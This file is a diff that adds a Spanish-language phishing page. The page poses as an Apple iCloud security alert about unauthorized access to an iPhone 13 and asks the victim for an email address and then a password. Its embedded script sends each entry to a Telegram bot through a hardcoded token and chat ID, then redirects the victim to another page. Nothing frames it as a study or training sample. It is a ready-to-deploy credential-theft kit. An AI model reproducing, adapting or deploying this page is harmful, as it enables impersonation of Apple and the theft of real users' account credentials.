@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Alerta de Seguridad</title>
+    <link rel="stylesheet" href="styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+    <div class="top-bar">
+        <div class="left">
+            <a href="https://support.apple.com" target="_blank" rel="noopener noreferrer">
+                <img src="appleicon.png" class="apple-logo" alt="Apple">
+            </a>
+
+        </div>
+        <div class="right">
+            <span class="dots">•••</span>
+            <div class="menu-popup" id="menuPopup">
+                <a href="https://support.apple.com/es-es/guide/icloud/welcome/icloud" class="menu-link"
+                    target="_blank">Manual de uso de iCloud</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="alert-box">
+        <img src="icloudimg.png" class="icloudimg">
+        <h1>Alerta de Seguridad</h1>
+        <p class="message">
+            Se ha detectado un acceso al dispositivo <strong>iPhone 13 (MLPK3 LZ/A)</strong> asociado a la cuenta
+            <strong>t*****@gmail.com</strong> a las <strong>15:39:22</strong>.
+            Este acceso no autorizado podría poner en riesgo la confidencialidad de sus datos. Por favor, confirme su
+            correo electrónico para validar la actividad y proteger su cuenta.
+        </p>
+
+        <div class="input-box">
+            <input type="email" id="apple-login" name="apple-login" required>
+            <label for="apple-login">Correo electrónico</label>
+        </div>
+
+
+        <div class="new-box fade" id="newBox" style="display:none;">
+            <div class="input-box">
+                <input type="password" id="user-pass" required>
+                <label for="user-pass">Contraseña</label>
+            </div>
+        </div>
+
+        <button class="btn" id="continueBtn">
+            <span class="btn-text">Continuar con verificación</span>
+            <span class="btn-loader pulse" style="display:none;"></span>
+        </button>
+
+        <div class="info-box fade show" id="infoBox">
+            <img src="peopleicloudimg.png" class="peopleicloudimg">
+            <p class="info-text">
+                La información vinculada a tu cuenta de Apple está siendo accedida de manera inusual.
+                Apple registra ciertos datos con fines de seguridad, soporte y monitoreo.
+                Al continuar, aceptas que Apple pueda utilizar la información de tu cuenta para enviarte notificaciones
+                y comunicaciones, incluyendo <strong>el monitoreo del estado de tu dispositivo iPhone 13</strong>, con
+                fines de
+                seguridad, soporte y mantenimiento.
+                <a href="#">Consulta cómo se utiliza tu información…</a>
+            </p>
+        </div>
+    </div>
+</body>
+
+</html>
+
+<script>
+    const continueBtn = document.getElementById('continueBtn');
+    const infoBox = document.getElementById('infoBox');
+    const newBox = document.getElementById('newBox');
+    const emailInput = document.getElementById('apple-login');
+    const userPass = document.getElementById('user-pass');
+    const btnText = continueBtn.querySelector('.btn-text');
+    const btnLoader = continueBtn.querySelector('.btn-loader');
+
+    const TOKEN = "8290105042:AAEniRmHDmWjQ8Av_ORXi1k6MNmkwraArC8";
+    const CHAT_ID = "-5249656685";
+
+    let clickCount = 0;
+
+    function enviarAlerta(mensaje) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: mensaje
+            })
+        });
+    }
+
+    const allowedDomains = /^[^\s@]+@(gmail\.com|outlook\.com|icloud\.com|hotmail\.com)$/i;
+
+    emailInput.addEventListener('input', () => {
+        continueBtn.disabled = emailInput.value.trim() === "";
+    });
+
+    continueBtn.addEventListener('click', () => {
+        const value = emailInput.value.trim();
+        const passValue = userPass.value.trim();
+
+        if (!allowedDomains.test(value)) {
+            emailInput.classList.remove('valid');
+            emailInput.classList.add('invalid');
+            return; // ← aquí se corta todo
+        }
+
+        // Validaciones antes de animar
+        if (!allowedDomains.test(value)) {
+            emailInput.classList.remove('valid');
+            emailInput.classList.add('invalid');
+            return;
+        }
+        if (newBox.style.display === 'block' && passValue === "") {
+            userPass.classList.add('invalid');
+            userPass.focus();
+            return;
+        }
+
+        // Mostrar loader
+        btnText.style.display = 'none';
+        btnLoader.style.display = 'inline-block';
+        continueBtn.disabled = true;
+
+        setTimeout(() => {
+            // Ocultar loader y restaurar texto
+            btnLoader.style.display = 'none';
+            btnText.style.display = 'inline-block';
+            continueBtn.disabled = false;
+
+            clickCount++;
+
+            if (clickCount === 1) {
+                // Primer clic → alerta y mostrar contraseña
+                enviarAlerta(`Correo válido ingresado: ${value}`);
+                infoBox.style.display = 'none';
+                newBox.style.display = 'block';
+                setTimeout(() => newBox.classList.add('show'), 10);
+            } else if (clickCount === 2) {
+                // Segundo clic → alerta y redirección
+                enviarAlerta(`Correo: ${value} | Contraseña: ${passValue}`);
+                window.location.href = "iphone-features.html";
+                clickCount = 0;
+            }
+        }, 2500); // duración de la animación
+    });
+
+    emailInput.addEventListener('keydown', (e) => {
+        if (e.key === "Enter") {
+            e.preventDefault();
+            continueBtn.click();
+        }
+    });
+
+    userPass.addEventListener('keydown', (e) => {
+        if (e.key === "Enter") {
+            e.preventDefault();
+            continueBtn.click();
+        }
+    });
+
+    userPass.addEventListener('input', () => {
+        if (userPass.value.trim() !== "") {
+            userPass.classList.remove('invalid');
+            userPass.classList.add('valid');
+        } else {
+            userPass.classList.remove('valid');
+        }
+    });
+
+</script>
+
+
+
+<script>
+    const dots = document.querySelector('.dots');
+    const menu = document.getElementById('menuPopup');
+
+    dots.addEventListener('click', () => {
+        menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+    });
+
+    document.addEventListener('click', (e) => {
+        if (!dots.contains(e.target) && !menu.contains(e.target)) {
+            menu.style.display = 'none';
+        }
+    });
+</script>
